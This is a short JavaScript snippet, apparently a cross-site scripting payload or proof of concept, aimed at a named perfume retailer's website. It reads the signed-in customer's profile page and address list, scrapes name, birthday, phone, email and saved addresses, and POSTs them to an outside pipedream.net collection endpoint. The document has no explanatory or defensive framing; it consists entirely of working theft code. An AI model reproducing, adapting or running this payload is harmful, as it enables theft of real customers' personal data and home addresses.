fetch('https://www.franciskurkdjian.com/eu-en/editprofile')
.then(response => response.text())
.then(html => {
const parser = new DOMParser();
const doc = parser.parseFromString(html, 'text/html');

const data = {
  firstname: doc.querySelector('[name="dwfrm_profile_customer_firstname"]').value,
  lastname: doc.querySelector('[name="dwfrm_profile_customer_lastname"]').value,
  birthday: doc.querySelector('[name="dwfrm_profile_customer_birthday"]').value,
  phone: doc.querySelector('[name="dwfrm_profile_customer_phone"]').value,
  email: doc.querySelector('[name="dwfrm_profile_customer_email"]').value
};

return fetch('https://www.franciskurkdjian.com/eu-en/addresslist')
  .then(response => response.text())
  .then(addressHtml => {
    const addressDoc = parser.parseFromString(addressHtml, 'text/html');
    const addressContainer = addressDoc.querySelectorAll('.container-address');
    const addresses = Array.from(addressContainer).map(div => div.textContent.trim());

    data.addresses = addresses;

    return fetch('https://eozvxox830clw9r.m.pipedream.net', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
  });
});
